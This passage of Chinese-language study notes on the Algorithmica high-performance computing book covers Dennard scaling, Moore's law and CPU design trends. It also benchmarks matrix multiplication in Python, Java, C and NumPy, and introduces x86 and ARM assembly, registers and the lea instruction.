162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(778,0)"></path></g><rect width="1103.7" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(1621.5,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mn" transform="translate(2677.2,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(778,0)"></path></g></g></g></svg></mjx-container></span></li>
<li><strong>功率密度保持不变</strong>：虽然晶体管数量增加，但由于每个晶体管功耗减少，总体功耗密度（单位面积的功耗）保持相对不变。</li>
</ul>
<p>Gordon
Moore在1975年就做出了预测，晶体管上微处理器的数量每两年就会翻一番。这就是我们熟知的摩尔定律。</p>
<p>上述两个理论都不是物理定律，它们都是专家的观测结果，在某种程度上一定会受到基础物理的制约。</p>
<blockquote>
<p>Thermodynamically, a computer is just a very efficient device for
converting electrical power into heat. This heat eventually needs to be
removed, and there are physical limits to how much power you can
dissipate from a millimeter-scale crystal. Computer engineers, aiming to
maximize performance, essentially just choose the maximum possible clock
rate so that the overall power consumption stays the same. If
transistors become smaller, they have less capacitance, meaning less
required voltage to flip them, which in turn allows increasing the clock
rate.</p>
</blockquote>
<p><strong>计算机的热力学本质</strong>：</p>
<ul>
<li>从热力学的角度来看，计算机实际上就是一种非常高效的设备，将电能转化为热能。</li>
<li>计算机在运行过程中会消耗电能并生成热量，随着功耗的增加，热量也会增加。因此，必须通过适当的散热机制将热量排除，否则过多的热量会影响计算机的稳定性和性能。</li>
</ul>
<p><strong>功耗与散热的物理限制</strong>：</p>
<ul>
<li><strong>物理限制</strong>：计算机的功耗有一定的物理限制，特别是在微米尺度的晶体管上。随着晶体管的尺寸变小，每个晶体管产生的热量会增加，而散热能力是有限的。因此，需要有效的散热设计来避免温度过高，导致计算机性能下降或硬件损坏。</li>
</ul>
<p><strong>计算机工程师的设计目标</strong>：</p>
<ul>
<li>在设计中，工程师们通常会选择<strong>最大可能的时钟频率</strong>，以保证在给定的功耗限制内，计算机能够提供尽可能高的性能。时钟频率越高，芯片每秒钟能够执行的操作就越多，从而提高计算能力。</li>
</ul>
<p><strong>晶体管尺寸对性能的影响</strong>：</p>
<ul>
<li>当晶体管变得更小时，<strong>电容变小</strong>，这意味着晶体管的开关所需的电压变低。因此，电压要求降低，进而可以提高时钟频率。更高的时钟频率意味着芯片能够在单位时间内处理更多的任务，从而提升计算性能。</li>
</ul>
<p>但2005年到2007年间，随着晶体管尺寸进一步缩小，<strong>漏电效应（leakage
effects）</strong>导致了微芯片设计面临的一个新的问题，使得之前依赖于缩小晶体管来提升性能的策略不再有效。</p>
<p><strong>漏电效应（Leakage Effects）</strong>：</p>
<ul>
<li><strong>晶体管尺寸过小</strong>：随着微芯片中的晶体管变得越来越小，电路的特征尺寸接近于纳米级别。这使得晶体管和周围电路之间的相互作用变得复杂，导致出现了<strong>漏电效应</strong>。</li>
<li><strong>磁场干扰</strong>：当晶体管的尺寸足够小，晶体管产生的电磁场开始影响到相邻电路中的电子运动。电场和磁场的干扰可能会导致电子朝着不该去的方向运动，进而引发<strong>不必要的加热</strong>和<strong>比特翻转</strong>（bit
flipping）。</li>
</ul>
<p><strong>不必要的加热</strong>：</p>
<ul>
<li>晶体管本应按照设计工作，但由于电流的误导，电子可能在错误的路径上流动，造成额外的<strong>热量产生</strong>。这不仅增加了能量消耗，还使得芯片的散热负担增加，进而影响芯片的稳定性。</li>
</ul>
<p><strong>比特翻转（Bit Flipping）</strong>：</p>
<ul>
<li>由于电流干扰和漏电效应，某些电子可能会被错误地推动到其他状态，这会导致<strong>比特翻转</strong>。比特翻转指的是存储的数据位发生错误，从而可能导致计算错误或系统故障。</li>
</ul>
<p>一种应对漏电效应的有效方法是增加电压，但是增加电压会导致功耗增加以及时钟频率降低。这样一来微型化的优势就开始减弱了。</p>
<blockquote>
<p>Here are some core approaches making use of more available
transistors that are driving recent computer designs:</p>
<ul>
<li>Overlapping the execution of instructions so that different parts of
the CPU are kept busy (pipelining);</li>
<li>Executing operations without necessarily waiting for the previous
ones to complete (speculative and out-of-order execution);</li>
<li>Adding multiple execution units to process independent operations
simultaneously (superscalar processors);</li>
<li>Increasing the machine word size, to the point of adding
instructions capable of executing the same operation on a block of 128,
256, or 512 bits of data split into groups (<a class="link" href="https://en.algorithmica.org/hpc/simd/">SIMD<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>);</li>
<li>Adding <a class="link" href="https://en.algorithmica.org/hpc/cpu-cache/">layers
of cache<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> on the chip to speed up <a class="link" href="https://en.algorithmica.org/hpc/external-memory/">RAM and external
memory<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> access time (memory doesn’t quite follow the laws of silicon
scaling);</li>
<li>Adding multiple identical cores on a chip (parallel computing,
GPUs);</li>
<li>Using multiple chips in a motherboard and multiple cheaper computers
in a data center (distributed computing);</li>
<li>Using custom hardware to solve a specific problem with better chip
utilization (ASICs, FPGAs).</li>
</ul>
</blockquote>
<p>以上列出了几种核心的计算机设计方法，利用更多可用的晶体管来推动近期计算机设计的进展。</p>
<ol type="1">
<li><strong>流水线技术（Pipelining）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：流水线技术将指令的执行分为多个阶段，使得每个阶段可以同时处理不同的指令。这样可以减少等待时间并提高执行效率。</li>
<li><strong>优势</strong>：通过重叠执行不同指令的不同部分，CPU的各个部分保持工作状态，提升了指令执行的并行度。</li>
</ul>
<ol start="2" type="1">
<li><strong>猜测执行和乱序执行（Speculative and Out-of-Order
Execution）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：在某些指令尚未完成时，处理器会提前执行一些推测的操作，或者不必等待前一条指令完成后才执行下一条指令。</li>
<li><strong>优势</strong>：提高了执行效率，减少了等待时间，尤其是在指令之间没有强依赖关系时。</li>
</ul>
<ol start="3" type="1">
<li><strong>超标量处理器（Superscalar Processors）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：通过在处理器中添加多个执行单元，允许同时处理多个独立的操作。</li>
<li><strong>优势</strong>：可以在每个时钟周期内并行执行多个指令，提升了计算能力。</li>
</ul>
<ol start="4" type="1">
<li><strong>SIMD（Single Instruction, Multiple Data）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：增加机器字长，使得处理器能够对128位、256位或512位的数据块进行操作，并对这些数据分组处理。</li>
<li><strong>优势</strong>：在进行数据处理时，同一指令可以同时操作多个数据，极大提高了处理能力，特别是在大规模数据并行处理（如图像和视频处理）时非常有效。</li>
</ul>
<ol start="5" type="1">
<li><strong>多级缓存（Multiple Layers of Cache）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：在芯片上添加多个层级的缓存，以加速RAM和外部内存的访问速度。</li>
<li><strong>优势</strong>：由于内存访问速度相对较慢，通过高速缓存可以显著减少CPU与内存之间的访问延迟，提升整体性能。</li>
</ul>
<ol start="6" type="1">
<li><strong>多核处理（Parallel Computing, GPUs）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：在芯片上添加多个相同的核心，允许同时处理多个任务或线程，适用于并行计算任务。</li>
<li><strong>优势</strong>：可以显著提升多任务处理能力，尤其适用于GPU计算（如图形渲染、深度学习等并行任务）。</li>
</ul>
<ol start="7" type="1">
<li><strong>分布式计算（Distributed Computing）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：使用多个芯片在主板上，或者在数据中心中使用多个便宜的计算机进行分布式计算。</li>
<li><strong>优势</strong>：通过将任务分配到多个计算节点，可以有效扩展计算能力，尤其适用于大规模数据处理和高性能计算。</li>
</ul>
<ol start="8" type="1">
<li><strong>定制硬件（ASICs, FPGAs）</strong></li>
</ol>
<ul>
<li><strong>原理</strong>：使用定制的硬件（如ASIC和FPGA）来解决特定问题，以便在特定任务中获得更好的芯片利用率和性能。</li>
<li><strong>优势</strong>：通过硬件的专门设计，可以为特定应用提供更高的性能和更低的功耗，广泛应用于加速特定计算任务，如加密算法、图像处理等。</li>
</ul>
<p>对于现代计算机来说，传统的“计算所有操作”来预测算法性能的方法不仅仅是有一点偏差，而是误差可能达到几个数量级。这表明我们需要采用新的计算模型和其他方式来评估算法的性能。</p>
<h4 id="编程语言">编程语言</h4>
<blockquote>
<p>The real answer, of course, is much more complicated and highly
dependent on what kind of “operation” you have in mind. It can be as low
as 10^7 for things like <a class="link" href="https://en.algorithmica.org/hpc/cpu-cache/latency">pointer
chasing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> and as high as 10^11 for <a class="link" href="https://en.algorithmica.org/hpc/simd">SIMD-accelerated<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> linear
algebra.</p>
</blockquote>
<p>这个对比旨在强调，在不同的硬件和操作类型下，算法的表现可能会有巨大的差异，单纯计算操作次数并不足以准确预测实际性能。在这里，<strong>更多的操作次数（10^11）</strong>
并不一定意味着更花时间，反而通过现代的硬件加速技术（如
SIMD），高效的并行计算能在短时间内处理更多操作。</p>
<blockquote>
<p>so one of the first things people did after creating computers was
create <em>programming languages</em>, which abstract away some details
of how computers operate to simplify the process of programming.</p>
</blockquote>
<p>人们在创造了计算机后第一件事就是创建编程语言，因为这能隐藏执行细节并简化编程过程。而编程语言具有不同的类型。</p>
<p>从程序员的角度来看：</p>
<ol type="1">
<li><strong>编译型语言</strong>（Compiled Languages）：
这类语言在执行之前会经过一个预处理阶段（编译），即把源代码转换为机器代码，然后直接执行。比如
C、Go、Rust
等语言。编译型语言通常执行效率较高，因为它们的代码已经完全被转换成了 CPU
可以直接理解的机器代码。</li>
<li><strong>解释型语言</strong>（Interpreted Languages）：
解释型语言的执行是在运行时进行的，程序并不会提前转换为机器代码，而是通过一个叫做<strong>解释器</strong>的程序逐行执行源代码。典型的解释型语言有
Python、JavaScript 和
Ruby。这类语言的优点是方便调试和动态执行，但通常速度较慢，因为每一行代码都需要实时解释执行。</li>
</ol>
<p>从计算机的角度来看：</p>
<ol type="1">
<li><strong>原生语言</strong>（Native Languages）：
原生语言直接生成机器代码，能够直接在 CPU
上执行，运行时不依赖其他中间层。像 C、Go 和 Rust
这样的编译型语言就属于原生语言，因为它们直接生成可以被操作系统和 CPU
执行的机器码。</li>
<li><strong>托管语言</strong>（Managed Languages）：
托管语言依赖某种运行时（runtime）来进行执行。运行时负责管理内存、执行代码等操作。Java、C#
和 Erlang
就是典型的托管语言，它们在执行之前会被编译成一种中间代码，然后由虚拟机（VM）来执行。比如
Java 代码会先被编译为字节码（bytecode），然后由 JVM 运行。</li>
</ol>
<p>根据上述的分类方式，编程语言可以分为三大类：</p>
<ol type="1">
<li><strong>解释型语言</strong>（Interpreted Languages）：比如
Python、JavaScript、Ruby 等。直接在运行时由解释器执行代码。</li>
<li><strong>带有运行时的编译语言</strong>（Compiled Languages with a
Runtime）：如 Java、C#、Erlang
等。源代码首先被编译为中间代码（比如字节码），然后由虚拟机或运行时执行。</li>
<li><strong>编译后的原生语言</strong>（Compiled Native Languages）：如
C、Go、Rust 等。直接编译成机器代码，可以直接在 CPU 上运行。</li>
</ol>
<p>为了直观感受这三类语言效率上的差距，我们可以以1024*1024规模的矩阵相乘来测试一下执行效率：</p>
<p>解释型语言（以python为例）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">a = [[random.random()</span><br><span class="line">      <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">      <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line">b = [[random.random()</span><br><span class="line">      <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">      <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line">c = [[<span class="number">0</span></span><br><span class="line">      <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">      <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            c[i][j] += a[i][k] * b[k][j]</span><br><span class="line"></span><br><span class="line">duration = time.time() - start</span><br><span class="line"><span class="built_in">print</span>(duration)</span><br></pre></td></tr></table></figure></div>
<p>我自己跑出来的结果大约是181秒左右。然后我们仔细看看发生了什么。</p>
<ul>
<li>首先解释器开始解析<code>c[i][j] += a[i][k] * b[k][j]</code>
这一个语句，然后去找a，b，c是什么类型。</li>
<li>找到a是一个列表，然后提取出[]的操作符，解析出a[i]，这仍然是一个列表，于是继续解析<code>a[i][k]</code>，这是一个float类型的数</li>
<li>之后取出并执行<code>*</code>操作</li>
<li>对b和c进行同样的解析，最终把结果存在<code>c[i][j]</code></li>
</ul>
<p>然后我们来看看<strong>托管语言</strong>（Managed
Languages），以java为例</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Matmul.java</span></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Matmul</span> {</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span>[][] a = <span class="keyword">new</span> <span class="title class_">double</span>[n][n];</span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span>[][] b = <span class="keyword">new</span> <span class="title class_">double</span>[n][n];</span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span>[][] c = <span class="keyword">new</span> <span class="title class_">double</span>[n][n];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">Random</span> <span class="variable">rand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) {</span><br><span class="line">                a[i][j] = rand.nextDouble();</span><br><span class="line">                b[i][j] = rand.nextDouble();</span><br><span class="line">                c[i][j] = <span class="number">0</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">                    c[i][j] += a[i][k] * b[k][j];</span><br><span class="line">                </span><br><span class="line">        <span class="type">double</span> <span class="variable">diff</span> <span class="operator">=</span> (System.nanoTime() - start) * <span class="number">1e-9</span>;</span><br><span class="line">        System.out.println(diff);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">javac Matmul.java</span><br><span class="line">java Matmul</span><br></pre></td></tr></table></figure></div>
<p>这仅仅用了2.4秒就完成了。</p>
<p>java 程序首先会被编译成 <strong>字节码</strong>，即
<code>.class</code>
文件。这些字节码不是针对某一特定硬件架构的机器码，而是跨平台的。字节码可以在任何支持
JVM 的平台上运行。字节码在 <strong>JVM</strong>（Java Virtual
Machine）中解释执行。<strong>JVM</strong> 是一个运行 Java
程序的虚拟机，它将字节码转换为适合当前硬件的<strong>机器指令</strong>。由于字节码不是直接的机器码，所以
JVM 执行过程会有一定的性能开销。</p>
<p>python也有类似于JVM的技术，称为<strong>PyPy</strong>。</p>
<p>然后最后我们看看编译型语言，如C。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> n 1024</span></span><br><span class="line"><span class="type">double</span> a[n][n], b[n][n], c[n][n];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) {</span><br><span class="line">            a[i][j] = (<span class="type">double</span>) rand() / RAND_MAX;</span><br><span class="line">            b[i][j] = (<span class="type">double</span>) rand() / RAND_MAX;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">clock_t</span> start = clock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">                c[i][j] += a[i][k] * b[k][j];</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> seconds = (<span class="type">float</span>) (clock() - start) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.4f\n"</span>, seconds);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -O3 -g test.c -o <span class="built_in">test</span>	<span class="comment">#我们开O3优化进行编译</span></span><br><span class="line">./poc</span><br></pre></td></tr></table></figure></div>
<p>只用了1.3秒就得到了结果。如果我们换为<code>gcc -O3 -march=native -ffast-math -g poc.c -o poc</code>，甚至可以在0.15秒左右的时间内得到结果。</p>
<p><code>-march=native</code>
标志告诉编译器将代码优化为运行在当前编译机器的CPU架构上。这意味着编译器会针对当前处理器的指令集和特定功能进行优化，利用特定的硬件指令来提升性能。</p>
<p>例如，现代CPU支持高级向量化指令（如
AVX、SSE），可以一次性处理多个数据元素，从而加速计算。使用
<code>-march=native</code>
标志后，编译器会利用这些指令，从而大幅提升性能。</p>
<p><code>-ffast-math</code>
标志允许编译器进行激进的浮点优化，例如放宽浮点数的舍入和精度要求。虽然这可能会引入一些不精确的计算，但也可以显著加速数学运算，使得编译器能够使用更快的（但精度较低的）浮点计算。</p>
<p>编译器还可以重新安排浮点操作，以避免一些昂贵的操作，或者利用硬件特定指令，例如用于并行操作的向量化指令。</p>
<p>我们现在回到python，但是使用 <a class="link" href="https://www.openblas.net/">OpenBLAS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>来进行计算：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">n = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">a = np.random.rand(n, n)</span><br><span class="line">b = np.random.rand(n, n)</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line">c = np.dot(a, b)</span><br><span class="line"></span><br><span class="line">duration = time.time() - start</span><br><span class="line"><span class="built_in">print</span>(duration)</span><br></pre></td></tr></table></figure></div>
<p>所用时间来到了惊人的0.02秒。<strong>OpenBLAS</strong>
是一个广泛使用的高效线性代数库，通常用于实现像矩阵乘法这样的操作。为了实现优化，OpenBLAS中关于稠密矩阵乘法的实现通常涉及大量手写的汇编代码，每种架构的代码都需要根据其硬件特性单独定制。这些实现可能有多达
<strong>5000行汇编代码</strong>，针对不同的硬件架构进行了深度优化，以充分利用其特性（如SIMD指令集、缓存优化等）。后续的内容将逐步解释如何利用一些优化技术来提升矩阵乘法的性能。最终的目标是开发出一种简化的矩阵乘法实现，仅需
<strong>不到40行C代码</strong>，并能够在性能上接近OpenBLAS的实现。</p>
<h3 id="二计算机架构">二、计算机架构</h3>
<h4 id="指令集架构isa">指令集架构（ISA）</h4>
<blockquote>
<p>Hardware engineers love abstractions too. An abstraction of a CPU is
called an <em>instruction set architecture</em> (ISA), and it defines
how a computer should work from a programmer’s perspective. Similar to
software interfaces, it gives computer engineers the ability to improve
on existing CPU designs while also giving its users — us, programmers —
the confidence that things that worked before won’t break on newer
chips.</p>
</blockquote>
<p>指令集架构（ISA）就像软件中的接口一样，规定了硬件需要支持的指令和功能。硬件工程师根据这个架构设计和实现具体的CPU，确保每个指令能够正确执行，而程序员则通过这些指令集来编写代码，而不需要关心底层硬件的具体实现细节。假设我们使用的是基于
<strong>x86</strong> 架构的 CPU。这个架构定义了一些基本的指令，如
<strong>MOV</strong>（移动数据）、<strong>ADD</strong>（加法）、<strong>JMP</strong>（跳转）等。无论你用什么样的
<strong>x86</strong> 处理器，这些指令的语义和功能始终保持一致。</p>
<p>指令集不同于字符编码集或即时通讯协议一样，能够低成本地在一台机器上完整的分别支持每一个不同的集合。一般机器会支持arm(RISC)或者x86(CISC)架构其中之一。</p>
<p>ARM架构被广泛应用于几乎所有的移动设备，如智能手机、平板电脑等。此外，还应用于一些智能设备和计算设备，包括电视、智能冰箱、微波炉、汽车自动驾驶系统等。因为ARM架构的处理器通常采用低功耗设计，适合移动设备和嵌入式设备使用。</p>
<p>x86架构几乎被所有的服务器和桌面计算机广泛使用。几乎所有的传统个人电脑（PC）和工作站都采用x86架构处理器。x86处理器通常提供更强大的性能，适合高性能计算需求，如桌面电脑、服务器等。相比于ARM处理器，x86处理器的功耗较高，但它们提供了更强的计算能力，因此适用于需要大量计算资源的应用场景。</p>
<h4 id="汇编语言">汇编语言</h4>
<blockquote>
<p>Assembly is very simple in the sense that it doesn’t have many
syntactical constructions compared to high-level programming
languages.</p>
</blockquote>
<p>相较于高级语言具有很多的语法结构，汇编语言相当简单。主要就是涉及到数据的读取，操作与存储以及指令的跳转。汇编十分接近机器码，我们能够方便的对机器码进行反汇编。</p>
<p>以下是<em>c = </em>a + *b这个功能实现的两种架构汇编实现示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;arm</span><br><span class="line">; *a = x0, *b = x1, *c = x2</span><br><span class="line">ldr w0, [x0]    ; load 4 bytes from wherever x0 points into w0</span><br><span class="line">ldr w1, [x1]    ; load 4 bytes from wherever x1 points into w1</span><br><span class="line">add w0, w0, w1  ; add w0 with w1 and save the result to w0</span><br><span class="line">str w0, [x2]    ; write contents of w0 to wherever x2 points</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;x86</span><br><span class="line">; *a = rsi, *b = rdi, *c = rdx </span><br><span class="line">mov eax, DWORD PTR [rsi]  ; load 4 bytes from wherever rsi points into eax</span><br><span class="line">add eax, DWORD PTR [rdi]  ; add whatever is stored at rdi to eax</span><br><span class="line">mov DWORD PTR [rdx], eax  ; write contents of eax to wherever rdx points</span><br></pre></td></tr></table></figure></div>
<p>我们能发现x86版本加法操作和内存加载在一条指令中同时进行，避免了额外的内存加载指令，这就可以用更少的指令实现更多的功能。而arm代表的RISC架构也有其优点，虽然每个指令只能完成一个操作，但可以通过高效的硬件流水线和指令并行执行来提高总体性能。</p>
<p>后续我们都以x86架构举例：</p>
<p>64、32、16以及8位寄存器的区别一般就体现在名字上（rax,eax,ax,al），其本质上就是使用某个寄存器的低位实现更少位数的寄存器。</p>
<p>寄存器一般分为通用寄存器，浮点寄存器，向量扩展寄存器以及特殊寄存器。向量扩展寄存器通常比普通的通用寄存器要宽，能够存储更多的数据。例如，现代的
x86 CPU 使用 <code>xmm</code> 寄存器来存储 128 位的数据，而
<code>ymm</code> 寄存器则存储 256 位的数据。</p>
<p>立即数就是在指令中出现的一些数字，一般而言会直接嵌入到机器码中，但这无疑增加了机器编码的复杂度，所以有些指令只能使用部分立即数，或者是不能用立即数（只能先加载到寄存器中再进行操作）。</p>
<p>当我们进行数据复制时，比如用mov指令，实际上是一个告诉CPU寄存器更名的过程，由于寄存器重命名的方式，<code>mov</code>
指令不会在 CPU 内部花费额外的时间来复制数据。现代 CPU
在执行指令时，会在内部使用一种称为<strong>重命名表（Rename
Table）</strong>的结构来跟踪寄存器的实际数据位置。当你执行
<code>mov</code> 指令时，CPU
只是更新寄存器映射表，而不进行数据的实际传输。这种操作通常不需要多余的时钟周期，只会消耗一个解码周期（即处理这条指令本身的时间）。<code>xchg</code>指令同理。</p>
<p>地址模式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SIZE PTR [base + index * scale + displacement]</span><br></pre></td></tr></table></figure></div>
<p>SIZE可以是BYTE,WORD,DWORD以及QWORD，分别对应着1个字节，2个字节，4个字节和8个字节。</p>
<p><strong>scale只能是 1, 2, 4, 或 8</strong>。</p>
<p>地址操作一般会用到<code>lea</code>指令，其功能如下：</p>
<ul>
<li><p><strong>计算有效地址</strong>：<code>lea</code>
指令的主要用途是计算一个内存地址，并将其存储到寄存器中。它不涉及任何实际的内存访问，仅仅是在计算过程中生成内存地址。通常这用于计算复杂的地址，例如数组的偏移。</p>
<p>例如，<code>lea eax, [ebx + 4*ecx]</code> 计算的是
<code>ebx + 4 * ecx</code> 的结果，并将该结果存入 <code>eax</code>
中。这条指令只是计算地址，并没有实际访问 <code>ebx + 4*ecx</code>
所指向的内存位置。</p></li>
</ul>
<p><code>lea</code>除了能获取地址，还能作为算术运算的优化工具</p>
<ul>
<li><p><strong>替代乘法和加法</strong>：<code>lea</code>
指令还常被作为一个算术优化技巧来替代乘法和加法运算，尤其在需要计算偏移量时非常有用。比如，乘以
3、5 或 9 的运算，可以通过 <code>lea</code>
来实现，避免了直接使用乘法指令（<code>mul</code>）的成本。</p>
<p>例如，如果你需要做 <code>a = b * 3</code>，你通常需要先进行
<code>a = b + b + b</code> 或使用乘法指令。但使用 <code>lea</code>
可以在一条指令中完成相同的计算：<code>lea eax, [ebx + ebx*2]</code>（这里
<code>ebx*2</code> 就是加法的一种优化）。这样就避免了乘法指令，改用了
<code>lea</code>。</p></li>
</ul>
<p>作为替代 <code>add</code> 的工具</p>
<ul>
<li><p><strong><code>lea</code> 替代
<code>add</code></strong>：<code>lea</code> 也常常作为 <code>add</code>
指令的替代，尤其是在需要执行多个加法操作时。<code>lea</code>
不需要单独的 <code>mov</code>
